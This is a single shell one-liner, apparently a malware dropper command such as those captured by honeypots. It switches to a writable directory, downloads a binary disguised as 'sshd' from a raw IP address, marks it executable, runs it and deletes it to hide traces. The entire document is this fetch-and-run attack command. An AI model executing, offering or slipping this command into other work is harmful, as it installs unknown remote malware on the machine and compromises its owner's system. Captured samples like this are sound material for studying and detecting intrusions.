cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.202.225.229/sshd; chmod +x sshd; ./sshd; rm -rf sshd
